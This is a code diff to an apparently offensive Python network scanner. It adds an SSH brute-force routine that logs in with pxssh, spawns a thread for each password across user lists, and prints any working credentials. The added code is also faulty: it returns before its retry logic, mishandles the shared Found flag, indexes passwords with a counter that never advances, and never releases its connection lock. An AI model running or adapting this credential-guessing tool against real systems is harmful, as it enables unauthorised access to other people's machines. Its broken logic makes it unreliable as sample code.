@@ -3,7 +3,9 @@ import nmap
 from termcolor import colored
 import telnetlib
 from ftplib import FTP
-
+from pexpect import pxssh
+import time
+from threading import Thread, BoundedSemaphore
 
 lhosts = []  # writes live hosts that are found here
 commonAdminPorts = [21, 22, 23, 25, 135, 3389]  # removed 80/443; causing problems
@@ -86,6 +88,8 @@ def check_vports():
         for port in vhost.ports:
             if port == 21:
                 check_ftp(vhost)
+            if port == 22:
+                check_ssh(vhost)
             if port == 23:
                 check_telnet(vhost)
 
@@ -146,6 +150,64 @@ def check_ftp(vhost):
                         # print "[!] Something went wrong: {0}".format(e)
                         x += 1
                 break 
+
+def check_ssh(vhost):
+    host = vhost.ip
+
+    global Found
+    global Fails
+    Found = False
+    Fails = 0
+
+    max_connections = 5
+    connection_lock = BoundedSemaphore(value=max_connections)
+    
+    def connect(host,user, password):
+        #print "[*] testing ssh {0}:{1}".format(user, password)
+        try:
+            s = pxssh.pxssh()
+            s.login(host, user, password)
+            print '[+] user && password found: {0} : {1}'.format(user, password)
+            Found = True
+            return s
+        except Exception as e:
+            return Fails + 1
+            if 'read_nonblocking' in str(e):
+                time.sleep(5)
+                s.login(host, user, passwords[x], False)
+            elif 'synchronize with original prompt' in str(e):
+                time.sleep(1)
+                s.login(host, user, passwords[x], False)
+                raise
+        #finally:
+            #try:
+                #connection_lock.release()
+            #except Exception as e:
+                #if e is "ValueError":
+                    #raise
+                #else:
+                    #print e
+                    #raise
+            # add something here to close openSSH prompt
+            # exit(0)
+    for user in users:
+        if Found is True:
+            print "[*] password found!"
+            break
+        if Fails > 5:
+            print "[*] too many timeouts!"
+            break
+        connection_lock.acquire()
+        x = 0
+        try:
+            for password in passwords:
+                t = Thread(target=connect, args=(host, user, password))
+                t.start()
+                #t.close()
+        except Exception as e:
+            print str(e)
+            # break
+        # break
 
 
 def main():
